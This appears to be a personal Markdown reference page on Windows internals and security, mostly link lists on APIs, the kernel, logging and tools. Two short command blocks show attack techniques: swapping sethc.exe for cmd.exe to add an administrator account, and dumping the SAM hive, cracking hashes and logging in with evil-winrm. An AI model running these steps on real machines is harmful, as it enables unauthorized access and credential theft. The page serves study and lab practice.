## Documentation

- http://ntoskrnl.org/ # BOOK
- https://learn.microsoft.com/en-us/windows/
- https://learn.microsoft.com/en-us/powershell/
- https://github.com/LazoVelko/Windows-Hacks
- https://github.com/0x6d69636b/windows_hardening
- https://virtualsamuraii.github.io/redteam/anatomie-des-edr-pt-1/
- https://cyber.gouv.fr/publications/mise-en-oeuvre-des-fonctionnalites-de-securite-de-windows-10-reposant-sur-la

## Setup

### Windows Client (Host / VM)

- https://massgrave.dev/	# activation keys
- [privacy setup win10/11](./setup.md)
- https://learn.microsoft.com/en-us/windows/resources/
- https://cloud.google.com/blog/topics/threat-intelligence/flare-vm-the-windows-malware?hl=en


### Windows Server

- [active_directory](./active_directory)
- https://learn.microsoft.com/en-us/windows-server/
- https://www.server-world.info/en/note?os=Windows_Server_2022&p=download


## Internals

### C/C++ Runtime

- https://en.wikipedia.org/wiki/Microsoft_Windows_library_files
- https://learn.microsoft.com/en-us/cpp/c-runtime-library/crt-library-features
- https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/crt-alphabetical-function-reference

### Userland WinAPI

- https://en.wikipedia.org/wiki/Windows_API
- https://learn.microsoft.com/en-us/windows/win32/api/
- https://caiorss.github.io/C-Cpp-Notes/WindowsAPI-cpp.html
- https://github.com/7etsuo/windows-api-function-cheatsheets
- https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list
- https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/wiki/01:-Introduction-and-Abstract

*Open source*

- https://gitlab.winehq.org/wine/wine 

#### (Undocumented) NT (syscall) API

- https://ntdoc.m417z.com/
- https://www.geoffchappell.com/studies/windows/win32/ntdll/
- https://j00ru.vexillium.org/syscalls/nt/64/
- https://en.wikipedia.org/wiki/Windows_Native_API

### Kernel

- https://en.wikipedia.org/wiki/Ntoskrnl.exe
- https://github.com/Faran-17/Windows-Internals
- https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals
- https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/

*Open source*

- https://reactos.org/wiki/

#### (Undocumented) Data Structures

- https://www.vergiliusproject.com/ # documentation (all kernels)
- https://empyreal96.github.io/nt-info-depot/index.html

*Processes*

- https://en.wikipedia.org/wiki/Process_Environment_Block
- https://en.wikipedia.org/wiki/Win32_Thread_Information_Block
- https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess

#### Inter Process Communications

- https://learn.microsoft.com/en-us/windows/win32/ipc/interprocess-communications
- https://github.com/p0dalirius/windows-coerced-authentication-methods
- https://jlajara.gitlab.io/Potatoes_Windows_Privesc

#### Logging (Windows Event Log)

- https://learn.microsoft.com/en-us/windows/win32/eventlog/event-logging
- https://learn.microsoft.com/en-us/windows/win32/wes/windows-event-log

#### Monitoring (Event Tracing for Windows)

- https://learn.microsoft.com/en-us/windows-hardware/test/wpt/event-tracing-for-windows
- https://www.vaadata.com/fr/blog/edr-endpoint-detection-and-response-fonctionnement-et-mecanismes-de-detection
- https://beta.hackndo.com/write-and-bypass-kernel-edr-part-1/

#### BPF

- [Implementing eBPF for Windows - lwn.net](https://lwn.net/Articles/857215/)


## Challenges

- [Windows Internals CTF](https://samsclass.info/126/WI2021.htm)
- https://tryhackme.com/module/windows-fundamentals
- https://www.root-me.org/en/Challenges/App-System/

## Tools

- https://learn.microsoft.com/fr-fr/sysinternals/downloads
- https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/getting-started-with-windbg/
- https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-overview

### WSL2 - Manage Storage

- https://stephenreescarter.net/how-to-shrink-a-wsl2-virtual-disk/

### LSA: change password (unlocked bios)

- https://maggick.fr/pages/lost-windows-password.html
- https://learn.microsoft.com/en-us/windows/win32/secauthn/lsa-authentication
- https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-logon-scenarios


```powershell
# bypass unlocked bios using a bootable linux
mount /dev/sdax /mnt
cp /mnt/Windows/System32/sethc.exe /mnt/Windows/System32/sethc_old.exe
cp /mnt/Windows/system32/cmd.exe /mnt/Windows/System32/sethc.exe

# boot windows + press shift 5 times
net user new_user new_password /add
net localgroup Administrators new_user /add
net user new_user /delete /f
```

#### Dump & crack password/hashes (persistent access)

- https://beta.hackndo.com/remote-lsass-dump-passwords/
- https://www.hackingarticles.in/credential-dumping-local-security-authority-lsalsass-exe/

```powershell
# /System32/config
reg save HKLM\sam ./sam.save
reg save HKLM\system ./system.save

impacket-secretsdump -sam sam.save -system system.save LOCAL #paste dump hashes in hashes.txt

hashcat -m 1000 hashes.txt wordlist.txt
evil-winrm -i <ip> -u <user> -p <passwd>
evil-winrm -i <ip> -u <user> -H <hash>
```

### Delete file

```powershell
# 5 passes 
Sdelete64.exe /p 5 "c:\users\user\file.txt"
```

### Drivers

```powershell
# Activate Kernel Memory Isolation
pnputil /enum-drivers
pnputil /delete-driver oemXX.inf /force
```

### DLL Hijacking

- https://docs.microsoft.com/fr-fr/windows/win32/dlls/dynamic-link-library-search-order
- https://sh0ckfr.com/pages/martine-a-la-recherche-de-la-dll-hijacking-perdue/
- https://sh0ckfr.com/pages/martin-et-le-dll-proxying-de-cristal/
- https://blog.slowerzs.net/posts/thievingfox/
